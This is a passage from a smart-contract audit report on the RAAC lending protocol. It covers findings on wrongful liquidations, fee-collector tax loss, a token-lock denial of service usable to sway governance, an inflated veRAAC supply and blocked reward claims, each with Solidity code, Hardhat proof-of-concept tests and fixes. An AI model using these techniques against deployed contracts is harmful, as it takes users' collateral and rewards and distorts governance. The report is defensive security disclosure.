    function borrow(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
        if (isUnderLiquidation[msg.sender]) revert CannotBorrowUnderLiquidation();

        UserData storage user = userData[msg.sender];

        uint256 collateralValue = getUserCollateralValue(msg.sender);

        if (collateralValue == 0) revert NoCollateral();

        // Update reserve state before borrowing
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Ensure sufficient liquidity is available
        _ensureLiquidity(amount);

        // Fetch user's total debt after borrowing
        uint256 userTotalDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex) + amount;

        // Ensure the user has enough collateral to cover the new debt
        if (collateralValue < userTotalDebt.percentMul(liquidationThreshold)) {
            revert NotEnoughCollateralToBorrow();
        }

        // Update user's scaled debt balance
        uint256 scaledAmount = amount.rayDiv(reserve.usageIndex);


        // Mint DebtTokens to the user (scaled amount)
       (bool isFirstMint, uint256 amountMinted, uint256 newTotalSupply) = IDebtToken(reserve.reserveDebtTokenAddress).mint(msg.sender, msg.sender, amount, reserve.usageIndex);

        // Transfer borrowed amount to user
        IRToken(reserve.reserveRTokenAddress).transferAsset(msg.sender, amount);

        user.scaledDebtBalance += scaledAmount;
        // reserve.totalUsage += amount;
        reserve.totalUsage = newTotalSupply;

        // Update liquidity and interest rates
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, 0, amount);

        // Rebalance liquidity after borrowing
        _rebalanceLiquidity();

        emit Borrow(msg.sender, amount);
    }
```

As expected, a health factor is measured which calculates whether the user's position is healthy or unhealthy. Users with unhealthy positions can be liquidated by any user calling LendingPool::initiateLiquidation which starts the liquidation process .

```solidity
**
     * @notice Allows anyone to initiate the liquidation process if a user's health factor is below threshold
     * @param userAddress The address of the user to liquidate
     */
    function initiateLiquidation(address userAddress) external nonReentrant whenNotPaused {
        if (isUnderLiquidation[userAddress]) revert UserAlreadyUnderLiquidation();

        // update state
        ReserveLibrary.updateReserveState(reserve, rateData);

        UserData storage user = userData[userAddress];

        uint256 healthFactor = calculateHealthFactor(userAddress);

        if (healthFactor >= healthFactorLiquidationThreshold) revert HealthFactorTooLow();

        isUnderLiquidation[userAddress] = true;
        liquidationStartTime[userAddress] = block.timestamp;

        emit LiquidationInitiated(msg.sender, userAddress);
    }

```

Once liquidation has been initiated, the user to be liquidated has a grace period in which they can repay their debts. Once the grace period has passed, liquidatable users can no longer close liquidations and can be liquidated by the stability pool via LendingPool::finalizeliquidation. The issue lies where the price of the RAACNft owned by the user to be liquidated is set to a higher value by RAAC due to any external conditions which increase the value of the user's house.

This price increase can make the user's health factor go above the threshold which no longer qualifies them for liquidation. The problem occurs because if the user doesnt have any funds to pay back to the Lending Pool contract to close the liquidation via LendingPool::closeLiquidation, then the stability pool will be able to liquidate the user when the user's health is above the threshold.

## Proof Of Code (POC)

This test was run in protocols-tests.js file in the "StabilityPool" describe block

```javascript
it("user is wrongfully liquidated when health factor is above threshold", async function () {
  //c for testing purposes

  await contracts.stabilityPool.connect(user1).deposit(STABILITY_DEPOSIT);
  await contracts.crvUSD
    .connect(user3)
    .approve(contracts.stabilityPool.target, STABILITY_DEPOSIT);
  await contracts.crvUSD
    .connect(user3)
    .transfer(contracts.stabilityPool.target, STABILITY_DEPOSIT); //c this is where the stability pool gets the crvUSD to cover the debt

  // Create position to be liquidated
  const newTokenId = HOUSE_TOKEN_ID + 2;
  await contracts.housePrices.setHousePrice(newTokenId, HOUSE_PRICE);
  await contracts.crvUSD
    .connect(user2)
    .approve(contracts.nft.target, HOUSE_PRICE);
  await contracts.nft.connect(user2).mint(newTokenId, HOUSE_PRICE);
  await contracts.nft
    .connect(user2)
    .approve(contracts.lendingPool.target, newTokenId);
  await contracts.lendingPool.connect(user2).depositNFT(newTokenId);
  await contracts.lendingPool.connect(user2).borrow(ethers.parseEther("90"));

  //c at this point, the user's health factor is unhealthy so they can be liquidated
  const user2healthfactor = await contracts.lendingPool.calculateHealthFactor(
    user2.address
  );
  console.log(`user2healthfactor: ${user2healthfactor}`);

  await contracts.lendingPool.connect(user3).initiateLiquidation(user2.address);
  await time.increase(24 * 60 * 60);

  //c between the grace period, the house price increases to a value that would make the user's health factor healthy again
  await contracts.housePrices.setHousePrice(
    newTokenId,
    ethers.parseEther("150")
  );

  //c user comes in to perform a routine health factor check after 24 hours and since they are healthy and dont know that liquidation has been initialized on their address, they feel they are safe so they carry on with their activities as usual
  const user2healthfactor1 = await contracts.lendingPool.calculateHealthFactor(
    user2.address
  );
  console.log(`user2healthfactor1: ${user2healthfactor1}`);

  const healthFactorLiquidationThreshold =
    await contracts.lendingPool.BASE_HEALTH_FACTOR_LIQUIDATION_THRESHOLD();

  assert(user2healthfactor1 > user2healthfactor);
  assert(user2healthfactor1 > healthFactorLiquidationThreshold);

  //c another 2 days pass which means the grace period is now over
  await time.increase(49 * 60 * 60);

  //c since initiateliquidation has been called, the stability pool will liquidate user2 successfully which shouldnt happen because the user's health factor was healthy before the grace period ended
  await contracts.lendingPool.connect(owner).updateState();
  const tx = await contracts.stabilityPool
    .connect(owner)
    .liquidateBorrower(user2.address);
});
```

## Impact

Unfair Liquidations: Users with healthy positions (post-collateral appreciation) lose their collateral unfairly.

Loss of Trust: Users may lose confidence in the protocol due to unexpected liquidations.

Financial Loss: Borrowers lose collateral for loans they could have otherwise repaid given the updated collateral value.

## Tools Used

Manual Review, Hardhat

## Recommendations

Ensure collateral prices are refreshed at both initiation and finalization of liquidations to reflect real-time values.

```solidity
function initiateLiquidation(address borrower) external {
    // Use latest collateral price
    refreshCollateralPrice(borrower);
    // ... existing logic ...
}

function finalizeLiquidation(address borrower) external {
    // Re-fetch the latest collateral price
    refreshCollateralPrice(borrower);
    // ... existing logic ...
}
```

## <a id='H-11'></a>H-11. Fee Collector receives less fees when a user burns RAACToken

## Summary

A vulnerability exists in the RAACToken smart contract that causes the fee collector to receive less tax than intended whenever a user burns tokens. This issue arises because of the burn effect introduced by RAACToken:: \_update , which applies a secondary tax deduction on the tax amount before it reaches the fee collector.

This unintended behavior reduces protocol revenue, causing a potential loss of funds for the fee collector and affecting any protocol mechanisms that depend on these collected fees.

## Vulnerability Details

RAACToken::burn() function in RAACToken is structured as follows:

```solidity
function burn(uint256 amount) external {
    uint256 taxAmount = amount.percentMul(burnTaxRate);
    _burn(msg.sender, amount - taxAmount);

    if (taxAmount > 0 && feeCollector != address(0)) {
        _transfer(msg.sender, feeCollector, taxAmount);
    }
}
```

The burn tax is first calculated as taxAmount = amount \* burnTaxRate / 10000.
The remaining amount (amount - taxAmount) is sent to \_burn().
The tax amount is then sent to the feeCollector via \_transfer().

RAACToken overrides the ERC20 \_update() function, which applies a tax whenever a transfer occurs:

```solidity
function _update(
    address from,
    address to,
    uint256 amount
) internal virtual override {
    uint256 baseTax = swapTaxRate + burnTaxRate;

    if (baseTax == 0 || from == address(0) || to == address(0) || whitelistAddress[from] || whitelistAddress[to] || feeCollector == address(0)) {
        super._update(from, to, amount);
        return;
    }

    uint256 totalTax = amount.percentMul(baseTax);
    uint256 burnAmount = totalTax * burnTaxRate / baseTax;

    super._update(from, feeCollector, totalTax - burnAmount);
    super._update(from, address(0), burnAmount);
    super._update(from, to, amount - totalTax);
}
```

Key Issue:

RAACToken::\_burn() internally calls RAACToken::\_update() with to = address(0).
Since RAACToken::\_update() skips taxes when to = address(0), no additional tax is applied when \_burn() is executed.
However, when the tax amount is sent to the fee collector (\_transfer(msg.sender, feeCollector, taxAmount)), it goes through RAACToken::\_update() again, where a second burn tax is applied to the tax amount.
This means that some of the tax that should go to the fee collector is instead burned, reducing protocol revenue.

## Proof Of Code (POC)

This test was run in the RAACToken.test.js file in the "Tax Calculation" describe block

```javascript
it("feecollector doesnt get full fees from user burns", async () => {
  const transferAmount = BigInt("1000000000000000000000"); // 1000 tokens
  const expectedTax = (transferAmount * TAX_RATE) / 10000n;

  const expectedBurn = (transferAmount * BURN_RATE) / 10000n;

  // Mint tokens to first user (using owner who is now minter)
  await raacToken.mint(users[0].address, transferAmount);

  // Track balances before transfer
  const initialSupply = await raacToken.totalSupply();
  const initialFeeCollector = await raacToken.balanceOf(feeCollector.target);
  console.log(
    "Initial Fee Collector Balance: ",
    initialFeeCollector.toString()
  );
  console.log("Initial Supply: ", initialSupply.toString());

  // Perform burn
  await raacToken.connect(users[0]).burn(transferAmount);

  //c since we know there will be a tax on burns, this is how much we expect to be burnt
  const expectedBurnamount = transferAmount - expectedBurn;
  console.log("Expected Burn Amount: ", expectedBurnamount.toString());

  //c get expected amount to be sent to fee collector
  const expectedFeeCollectorAmount = initialSupply - expectedBurnamount;
  console.log(
    "Expected Fee Collector Amount: ",
    expectedFeeCollectorAmount.toString()
  );

  //c get actual amount sent to fee collector
  const postBurnFeeCollector = await raacToken.balanceOf(feeCollector.target);
  console.log(
    "Post Burn Fee Collector Balance: ",
    postBurnFeeCollector.toString()
  );

  //c due to the extra burn in transfer function, the fee collector will get less than the expected amount
  assert(
    expectedFeeCollectorAmount.toString() > postBurnFeeCollector.toString()
  );
});
```

## Impact

Fee Collector Receives Less Revenue Than Expected: The protocol expects full tax collection from token burns. Instead, some of the tax is being burned, causing a revenue shortfall.

Negative Effect on Protocol Mechanisms That Depend on Fees : RAAC Ddocumentation at [https://docs.raac.io/quickstart/about-raac ](https://docs.raac.io/quickstart/about-raac)say the following about the RAACToken:

"It includes a built-in tax and fee collection mechanisms that is collected by the protocol in order to finance real-world aspects related to the properties (for instance, repairs). " If fee collection funds are reduced, RAAC has less funds to perform its real-world aspects

## Tools Used

Manual Review, Hardhat

## Recommendations

Modify \_update() to exempt transfers where to == feeCollector so that the tax amount is not reduced by an extra burn.

```solidity

if (baseTax == 0 || from == address(0) || to == address(0) || to == feeCollector || whitelistAddress[from] || whitelistAddress[to] || feeCollector == address(0)) {
    super._update(from, to, amount);
    return;
}
```

Now, tax is not applied when sending tax amounts to the fee collector.

## <a id='H-12'></a>H-12. Incorrect BoostCalculator::endTime expectations cause DOS which attackers can use to manipulate key votes

## Summary

This vulnerability introduces a denial-of-service (DoS) condition that prevents users from locking their RAACTokens for veRAAC during a specific time frame due to an inconsistent period validation mechanism. This issue becomes particularly critical in governance scenarios, where users need to lock tokens to participate in voting. If this bug occurs right before an important governance vote, affected users will be unable to obtain voting power, leading to unrepresentative governance decisions. Additionally, malicious actors could exploit this bug by strategically extending totalDuration to prevent new users from locking tokens before a vote, consolidating voting power among a smaller group of existing veRAAC holders. This could compromise protocol integrity, allowing governance control to be manipulated.

## Vulnerability Details

A user can lock RAACTokens to gain veRAAC tokens via veRAACToken::lock. See below:

```solidity
 /**
     * @notice Creates a new lock position for RAAC tokens
     * @dev Locks RAAC tokens for a specified duration and mints veRAAC tokens representing voting power
     * @param amount The amount of RAAC tokens to lock
     * @param duration The duration to lock tokens for, in seconds
     */
    function lock(uint256 amount, uint256 duration) external nonReentrant whenNotPaused {
        if (amount == 0) revert InvalidAmount();
        if (amount > MAX_LOCK_AMOUNT) revert AmountExceedsLimit();
        if (totalSupply() + amount > MAX_TOTAL_SUPPLY) revert TotalSupplyLimitExceeded();
        if (duration < MIN_LOCK_DURATION || duration > MAX_LOCK_DURATION)
            revert InvalidLockDuration();

        // Do the transfer first - this will revert with ERC20InsufficientBalance if user doesn't have enough tokens
        raacToken.safeTransferFrom(msg.sender, address(this), amount);

        // Calculate unlock time
        uint256 unlockTime = block.timestamp + duration;

        // Create lock position
        _lockState.createLock(msg.sender, amount, duration);
        _updateBoostState(msg.sender, amount);

        // Calculate initial voting power
        (int128 bias, int128 slope) = _votingState.calculateAndUpdatePower(
            msg.sender,
            amount,
            unlockTime
        );

        // Update checkpoints
        uint256 newPower = uint256(uint128(bias));
        _checkpointState.writeCheckpoint(msg.sender, newPower);

        // Mint veTokens
        _mint(msg.sender, newPower);

        emit LockCreated(msg.sender, amount, unlockTime);
    }
```

This function calls veRAACToken::\_updateBoostState which in turn calls BoostCalculator::updateBoostPeriod which is our main focus.

```solidity
  /**
     * @notice Updates the global boost period
     * @dev Initializes or updates the time-weighted average for global boost
     * @param state The boost state to update
     */
    function updateBoostPeriod(
        BoostState storage state
    ) internal {
        if (state.boostWindow == 0) revert InvalidBoostWindow();
        if (state.maxBoost < state.minBoost) revert InvalidBoostBounds();

        uint256 currentTime = block.timestamp;
        uint256 periodStart = state.boostPeriod.startTime;

        // If no period exists, create initial period starting from current block
        if(periodStart > 0) {
            // If current period has ended, create new period
            if (currentTime >= periodStart + state.boostWindow) {
                TimeWeightedAverage.createPeriod(
                    state.boostPeriod,
                    currentTime,
                    state.boostWindow,
                    state.votingPower,
                    state.maxBoost
                );
                return;
            }
            // Update existing period
            state.boostPeriod.updateValue(state.votingPower, currentTime);
            return;
        }

        // If no period exists, create initial period starting from current block
        TimeWeightedAverage.createPeriod(
            state.boostPeriod,
            currentTime,
            state.boostWindow,
            state.votingPower,
            state.maxBoost
        );
    }

```

The idea of this function is that it creates a period struct that uses time weighted averages to keep track of all user's locked voting weight by measuring their voting power weighted against how long they have been locked for. This period is a global period that measures the boost multiplier of all users based on their weighted values. If a period has already been started but the period has ended, the function calls TimeWeightedAverage::createPeriod to create a new period. The criteria for a period ending is determined when the current timestamp is >= period start time + the boost window of the period which is initialised in veRAACToken as 7 days.

The bug occurs via the following check in TimeWeightedAverage::createPeriod:

```solidity
 if (
            self.startTime != 0 &&
            startTime < self.startTime + self.totalDuration
        ) {
            revert PeriodNotElapsed();
        }
```

self.totalduration is a variable in the point struct that is initially set to the boost window but whenever the period is updated via TimeWeightedAverage::updateValue, self.totalDuration is incremented. See below:

```solidity
 /**
     * @notice Updates current value and accumulates time-weighted sums
     * @dev Calculates weighted sum based on elapsed time since last update
     * @param self Storage reference to Period struct
     * @param newValue New value to set
     * @param timestamp Time of update
     */
    function updateValue(
        Period storage self,
        uint256 newValue,
        uint256 timestamp
    ) internal {
        if (timestamp < self.startTime || timestamp > self.endTime) {
            revert InvalidTime();
        }

        unchecked {
            uint256 duration = timestamp - self.lastUpdateTime;
            if (duration > 0) {
                uint256 timeWeightedValue = self.value * duration;
                if (timeWeightedValue / duration != self.value) revert ValueOverflow();
                self.weightedSum += timeWeightedValue;
                self.totalDuration += duration;
            }
        }
```

As a result, if the period is updated, the endTime is not consistent with the expected endTime in BoostCalculator::updateBoostPeriod. Since the endTime in TimeWeightedAverage::createPeriod is no longer periodStart + state.boostWindow due to the increment of the totalDuration variable, if a user attempts to lock tokens between the expected endTime in BoostCalculator::updateBoostPeriod and the expected endTime in TimeWeightedAverage::createPeriod , the transaction will revert which prevents the user from being able to lock their RAACTokens for a period of time which causes an unnecessary DOS.

## Proof Of Code (POC)

This test was run in the veRAACToken.test.js file in the "Lock Mechamism" describe block

This is the process flow of the DOS with an example :

A user creates a period at T=20 with a boostWindow = 10.

This sets endTime = 20 + 10 = 30.
totalDuration is now initialized to 10.
Another user locks tokens at T=25 with a boostWindow = 10.

Since the current time (T=25) is less than the period's endTime (30), the contract calls TimeWeightedAverage::updateValue().

Within this function:
duration is calculated as currentTime - lastUpdateTime = 25 - 20 = 5.
totalDuration increases by 5, making it 15.
A new user attempts to lock tokens at T=32.

The contract checks:
periodStart > 0 → True (period started at T=20).
currentTime (32) > periodStart + boostWindow (30) → True.

Since the period is assumed to have ended, the contract attempts to create a new period by calling TimeWeightedAverage::createPeriod().

Inside createPeriod(), the function checks:

```solidity
if (self.startTime != 0 && currentTime < self.startTime + self.totalDuration)
```

Substituting values:
self.startTime = 20
currentTime = 32
self.totalDuration = 15

The condition evaluates to:

```solidity
32 < 20 + 15   // 32 < 35 → True
```

Since the condition is true, the function reverts—even though it should not.
As a result, the user attempting to lock tokens at T=32 encounters an unexpected reversion.

```javascript
it("user cannot create lock via when previous period end time has elapsed", async () => {
  const amount = ethers.parseEther("1000");
  const duration = 365 * 24 * 3600; // 1 year

  // Create lock first
  const tx = await veRAACToken.connect(users[0]).lock(amount, duration);

  // Wait for the transaction
  await tx.wait();

  // Create another lock within same time frame but within same time frame as previous period
  await time.increase(24 * 3600); // 1 day

  const tx2 = await veRAACToken.connect(users[1]).lock(amount, duration);

  // Wait for the transaction
  await tx2.wait();

  // get boost state
  const boost = await veRAACToken.getBoostState();
  const boostwindow = boost.boostWindow;
  const startTime = boost.boostPeriod.startTime;
  const endTime = boost.boostPeriod.endTime;
  const lastUpdateTime = boost.boostPeriod.lastUpdateTime;
  const totalDuration = boost.boostPeriod.totalDuration;
  console.log("Boost Window: ", boostwindow);
  console.log("Start Time: ", startTime);
  console.log("End Time: ", endTime);
  console.log("Last Update Time: ", lastUpdateTime);
  console.log("Total Duration: ", totalDuration);

  // Create another lock within same time frame but within same time frame as previous period
  await time.increase(6 * 24 * 3600); //c allow 6 more days to pass so that the period has ended and a new one should be started

  //c confirm that the current timestamp is greater than or equal to the endtime of the previous period which means that when a user locks tokkens, a new global period should be started and no revert should occur
  const currentTime = await time.latest();
  console.log("Current Time: ", currentTime);
  assert(endTime == startTime + boostwindow);
  assert(
    currentTime >= endTime,
    "Current Time is less than end time of previous period"
  );
  await expect(
    veRAACToken.connect(users[2]).lock(amount, duration)
  ).to.be.revertedWithCustomError(veRAACToken, "PeriodNotElapsed");
});
```

Note: For test to run successfully, I added the following to veRAACToken::BoostStateView :

```solidity
 /**
     * @notice View struct for boost state information
     */
    struct BoostStateView {
        uint256 minBoost; // Minimum boost multiplier in basis points
        uint256 maxBoost; // Maximum boost multiplier in basis points
        uint256 boostWindow; // Time window for boost calculations
        uint256 totalVotingPower; // Total voting power in the system
        uint256 totalWeight; // Total weight of all locks
        TimeWeightedAverage.Period boostPeriod; // Global boost period //c for testing purposes
    }

 function getBoostState() external view returns (BoostStateView memory) {
        return
            BoostStateView({
                minBoost: _boostState.minBoost,
                maxBoost: _boostState.maxBoost,
                boostWindow: _boostState.boostWindow,
                totalVotingPower: _boostState.totalVotingPower,
                totalWeight: _boostState.totalWeight,
                boostPeriod: _boostState.boostPeriod //c for testing purposes
            });
    }
```

This was a view function and I adapted it to allow for viewing the period's data.

## Impact

This vulnerability poses a critical governance risk, as it can prevent users from locking RAACTokens and obtaining veRAAC voting power during key decision-making periods. If a governance vote is scheduled while this bug is active, affected users will be unable to participate, leading to skewed governance outcomes. Malicious actors could strategically trigger this issue to block new veRAAC holders from voting, ensuring only pre-existing stakeholders influence decisions. This creates centralization risks, as governance control shifts to a small group of participants. Additionally, users unable to lock tokens may miss out on governance incentives.

## Tools Used

Manual Review, Hardhat

## Recommendations

Update Period Validation in createPeriod
Modify the if condition in TimeWeightedAverage::createPeriod to use boostWindow rather than totalDuration:

```solidity
if (
self.startTime != 0 &&
startTime < self.startTime + boostWindow //  Use boostWindow instead of totalDuration
) {
revert PeriodNotElapsed();
}

```

This ensures that period validation remains consistent and does not revert incorrectly.

## <a id='H-13'></a>H-13. User's cannot claim full rewards via flawed totalSupply implementation

## Summary

The RAAC protocol implements a voting escrow mechanism where users lock RAAC tokens to receive veRAAC, which grants them voting power. However, the contract does not correctly account for the gradual decrease in voting power due to the slope mechanism, which causes an overestimation of the total supply of veRAAC. This leads to an inaccurate distribution of rewards, where users receive fewer rewards than they are entitled to. The vulnerability arises because the contract uses a standard totalSupply() function to determine the total voting power, instead of dynamically adjusting it based on each user's decaying bias over time.

## Vulnerability Details

To understand this, we need to go over how totalSupply works in voting escrows. These are the formulae for calculating a user's bias and slope. The bias is the user's balance at a point in time. A user's bias goes down over time which means their voting power goes down over time. See below:

bias = (amountLocked / MAX_TIME ) times (lockEndTime - block.timestamp)
slope = amountLocked / MAX_TIME

The slope can also be described as the rate of decay of tokens per second. It signifies how much each token should drop per second. So if a user has a bias when they lock tokens with a timestamp recorded, we can calculate the the user's bias at any given point by comparing how much the token has decayed and subtracting it from their bias at the time tokens were initially locked.

currentBias= point.bias - (point.slope times (block.timestamp - point.timestamp))

This is what determines the user's bias. So all is well and good but now we know that the user's bias (balance) always goes down as time passes, the total supply of all veTokens obviously can't be gotten using the usual totalSupply function that an ERC20 contract uses. This is actually a problem that happened right here with RAAC and I will use their protocol to show why.

So in veRAACToken, this is how users lock RAAC to get veRAAC:

```solidity
 /**
     * @notice Creates a new lock position for RAAC tokens
     * @dev Locks RAAC tokens for a specified duration and mints veRAAC tokens representing voting power
     * @param amount The amount of RAAC tokens to lock
     * @param duration The duration to lock tokens for, in seconds
     */
    function lock(uint256 amount, uint256 duration) external nonReentrant whenNotPaused {
        if (amount == 0) revert InvalidAmount();
        if (amount > MAX_LOCK_AMOUNT) revert AmountExceedsLimit();
        if (totalSupply() + amount > MAX_TOTAL_SUPPLY) revert TotalSupplyLimitExceeded();
        if (duration < MIN_LOCK_DURATION || duration > MAX_LOCK_DURATION)
            revert InvalidLockDuration();

        // Do the transfer first - this will revert with ERC20InsufficientBalance if user doesn't have enough tokens
        raacToken.safeTransferFrom(msg.sender, address(this), amount);

        // Calculate unlock time
        uint256 unlockTime = block.timestamp + duration;

        // Create lock position
        _lockState.createLock(msg.sender, amount, duration);
        _updateBoostState(msg.sender, amount);

        // Calculate initial voting power
        (int128 bias, int128 slope) = _votingState.calculateAndUpdatePower(
            msg.sender,
            amount,
            unlockTime
        );

        // Update checkpoints
        uint256 newPower = uint256(uint128(bias));
        _checkpointState.writeCheckpoint(msg.sender, newPower);

        // Mint veTokens
        _mint(msg.sender, newPower);

        emit LockCreated(msg.sender, amount, unlockTime);
    }

```

The main part we are focusing on is where users are minted veRAAC in the function. You can see that when a user creates a lock, their bias is calculated and then they are minted that bias which represents their balance. This works well but that voting power is only valid until 1 second has passed because of the slope. The slope implies that every second, the user's balance decreases so for example, say the bias was 100 and the slope (rate of decay) was 1. So once the user is minted veRAAC tokens, which are 100, once a second passes, that balance should be reduced to 99 to reflect their new bias. the totalsupply should also be updates to reflect this change which is very important because if the users lock duration is over but they haven't withdraw yet, their bias is 0 yet the totalSupply will still be 100 since they havent withdrawn which burns the tokens. This is where the exploit occurs. As a result, the user's tokens are still taken into consideration in totalSupply calculations when the tokens hold no power, they should no longer be considered in totalSupply calculations

RAAC did not implement voting escrow total supply mechanics and what this meant was that their totalSupply was inaccurate. This is how voting power was calculated in veRAACToken.sol.

```solidity
function getTotalVotingPower() external view override returns (uint256) {
        return totalSupply();
    }

```

which as we discussed doesn't factor slope changes in the calculation.

As a result, when user's are to claim rewards via FeeCollector::claimRewards, the rewards are first calculated via FeeCollector::\_calculatePendingRewards:

```solidity
function _calculatePendingRewards(address user) internal view returns (uint256) {
        uint256 userVotingPower = veRAACToken.getVotingPower(user);
        if (userVotingPower == 0) return 0;

        uint256 totalVotingPower = veRAACToken.getTotalVotingPower();
        if (totalVotingPower == 0) return 0;

        uint256 share = (totalDistributed * userVotingPower) / totalVotingPower;
        return share > userRewards[user] ? share - userRewards[user] : 0;
    }

```

As seen above, veRAACToken::getTotalVotingPower is called which we referenced above, simply returns the totalSupply of veRAAC tokens which is wrongly implemented as it doesn't account for each user's bias changes over time. As a result, the totalSupply value is inflated which leads to user's getting less rewards that intended.

## Proof Of Code (POC)

This test was run in the FeeCollector.test.js file in the "Fee Collection and Distribution" describe block. To run this test, import the assert statement from chai at the top of the file for the test to run as expected

```javascript
it("users get less rewards due to totalSupply overestimation", async function () {
      //c for testing purposes
      //c users have already locked tokens in the beforeEach block

      //c wait for half of the year so the user's biases to change
      await time.increase(ONE_YEAR / 2); // users voting power should be reduced as duration has passed

      //c get user biases
      const user1Bias = await veRAACToken.getVotingPower(user1.address);
      const user2Bias = await veRAACToken.getVotingPower(user2.address);
      const expectedTotalSupply = user1Bias + user2Bias;
      console.log("User 1 Bias: ", user1Bias);
      console.log("User 2 Bias: ", user2Bias);
      console.log("Expected Total Supply: ", expectedTotalSupply);

      //c get actual total supply
      const actualTotalSupply = await veRAACToken.totalSupply();
      console.log("Actual Total Supply: ", actualTotalSupply);

      //c due to improper tracking, expectedtotalsupply will be less than the actual total supply
      assert(expectedTotalSupply < actualTotalSupply);

      //c get the share of totalfees allocated to veRAAC holders
      const tx1 = await feeCollector.connect(owner).distributeCollectedFees();
      const tx1Receipt = await tx1.wait();
      const eventLogs = tx1Receipt.logs;

      let veRAACShare;

      for (let log of eventLogs) {
        if (log.fragment && log.fragment.name === "FeeDistributed") {
          veRAACShare = log.args[0];
          break;
        }
      }
      console.log("veRAAC Share: ", veRAACShare);

      //c manually calculate user pending rewards and compare it to the rewards actually received which will show that the user received less rewards than they should have
      const user1PendingRewards =
        (veRAACShare * user1Bias) / expectedTotalSupply;
      console.log("User 1 Pending Rewards: ", user1PendingRewards);

      const initialBalance = await raacToken.balanceOf(user1.address);
      const tx2 = await feeCollector.connect(user1).claimRewards(user1.address);
      const tx2Receipt = await tx2.wait();
      const eventLogs2 = tx2Receipt.logs;

      let user1Reward;

      for (let log of eventLogs2) {
        if (log.fragment && log.fragment.name === "RewardClaimed") {
          user1Reward = log.args[1];
          break;
        }
      }

      console.log("User 1 Actual Rewards: ", user1Reward);
      assert(user1PendingRewards > user1Reward);
    });
  });
```

## Impact

Users Receive Fewer Rewards Than They Deserve: Since the total supply of veRAAC is incorrectly high, each user's reward allocation is diluted. Users who have locked tokens for a long time may see their expected rewards significantly reduced.

## Tools Used

Manual Review, Hardhat

## Recommendations

Implement proper totalSupply mechanics that follow voting escrow methodology. See an example solution below:

- The contract allows lock ends to be only on the exact timestamp a week ends (timestamp % 604800 == 0)
- Upon a user creating a lock, the contract adds their bias and slope to the global variables.
- Then it adds the user's slope to a mapping slopeChanges(uint256 timestamp => int256 slopeChange)
- Any time a week's end is crossed, it applies all the necessary slope changes (decreases the global slope)

By doing all of the above, the contract makes sure that at all times the sum of all user balance equals exactly the total supply.

## <a id='H-14'></a>H-14. DOS in FeeCollector::claimRewards which prevents users from claiming rewards in subsequent periods

## Summary

In the RAAC protocol, users with veRAAC tokens are eligible to claim protocol rewards through the FeeCollector::claimRewards function. The protocol distributes rewards over 7-day periods, ensuring fair allocation based on voting power. However, due to an improper state update, users who claimed rewards in a previous period are unable to claim rewards in a new period—even when they are eligible. This occurs because their claim state is incorrectly tied to totalDistributed from the previous period, preventing them from receiving rewards in the next cycle. This issue creates a denial-of-service (DoS) vulnerability, significantly reducing user incentives to hold veRAAC tokens.

## Vulnerability Details

Users with veRAAC tokens are eligible to claim protocol rewards via FeeCollector::claimRewards:

```solidity
 /**
     * @notice Claims accumulated rewards for a user
     * @param user Address of the user claiming rewards
     * @return amount Amount of rewards claimed
     */
    function claimRewards(address user) external override nonReentrant whenNotPaused returns (uint256) {
        if (user == address(0)) revert InvalidAddress();

        uint256 pendingReward = _calculatePendingRewards(user);
        if (pendingReward == 0) revert InsufficientBalance();

        // Reset user rewards before transfer
        userRewards[user] = totalDistributed;

        // Transfer rewards
        raacToken.safeTransfer(user, pendingReward);

        emit RewardClaimed(user, pendingReward);
        return pendingReward;
    }
```

Protocol fees are distributed in 7 day periods via FeeCollector::distributeCollectedFees which calls FeeCollector::\_processDistributions. This is where the periods are set. See below:

```solidity
/**
     * @dev Processes the distribution of collected fees
     * @param totalFees Total fees to distribute
     * @param shares Distribution shares for different stakeholders
     */
    function _processDistributions(uint256 totalFees, uint256[4] memory shares) internal {
        uint256 contractBalance = raacToken.balanceOf(address(this));
        if (contractBalance < totalFees) revert InsufficientBalance();

        if (shares[0] > 0) {
            uint256 totalVeRAACSupply = veRAACToken.getTotalVotingPower();
            if (totalVeRAACSupply > 0) {
                TimeWeightedAverage.createPeriod(
                    distributionPeriod,
                    block.timestamp + 1,
                    7 days,
                    shares[0],
                    totalVeRAACSupply
                );
                totalDistributed += shares[0];
            } else {
                shares[3] += shares[0]; // Add to treasury if no veRAAC holders
            }
        }

        if (shares[1] > 0) raacToken.burn(shares[1]);
        if (shares[2] > 0) raacToken.safeTransfer(repairFund, shares[2]);
        if (shares[3] > 0) raacToken.safeTransfer(treasury, shares[3]);
    }

```

The bug occurs due to the following line in FeeCollector::\_calculatePendingRewards:

```solidity
        return share > userRewards[user] ? share - userRewards[user] : 0;

```

This line is designed to prevent user's from repeatedly claiming rewards. In FeeCollector::claimRewards, userRewards[user] is set to totalDistributed. totalDistributed is updated to the amount of shares that veRAAC holders are eligible to claim during the distribution period. The issue is that when a new period starts, userRewards[user] is still set to totalDistributed which means that when rewards have been distributed in the new period, a user who has claimed in the previous period will not be able to claim rewards for the new period which they are eligible for.

## Proof Of Code (POC)

This test was run in the FeeCollector.test.js file in the "Fee Collection and Distribution" describe block

```javascript
it("user cannot claim rewards in new distribution period", async function () {
  //c for testing purposes
  //c users have already locked tokens in the beforeEach block

  //c wait for half of the year so the user's biases change
  await time.increase(ONE_YEAR / 2); // users voting power should be reduced as duration has passed

  //c get user biases
  const user1Bias = await veRAACToken.getVotingPower(user1.address);
  const user2Bias = await veRAACToken.getVotingPower(user2.address);
  const expectedTotalSupply = user1Bias + user2Bias;
  console.log("User 1 Bias: ", user1Bias);
  console.log("User 2 Bias: ", user2Bias);
  console.log("Expected Total Supply: ", expectedTotalSupply);

  //c get actual total supply
  const actualTotalSupply = await veRAACToken.totalSupply();
  console.log("Actual Total Supply: ", actualTotalSupply);

  //c due to improper tracking, expectedtotalsupply will be less than the actual total supply
  assert(expectedTotalSupply < actualTotalSupply);

  //c get the share of totalfees allocated to veRAAC holders
  const tx1 = await feeCollector.connect(owner).distributeCollectedFees();
  const tx1Receipt = await tx1.wait();

  await feeCollector.connect(user1).claimRewards(user1.address);

  // Calculate gross amounts needed including transfer tax but make these fees less than the user1 claimed last time to show that the user cannot claim rewards in a new period

  const taxRate = SWAP_TAX_RATE + BURN_TAX_RATE; // 150 basis points (1.5%)
  const grossMultiplier =
    BigInt(BASIS_POINTS * BASIS_POINTS) /
    BigInt(BASIS_POINTS * BASIS_POINTS - taxRate * BASIS_POINTS);

  const protocolFeeGross =
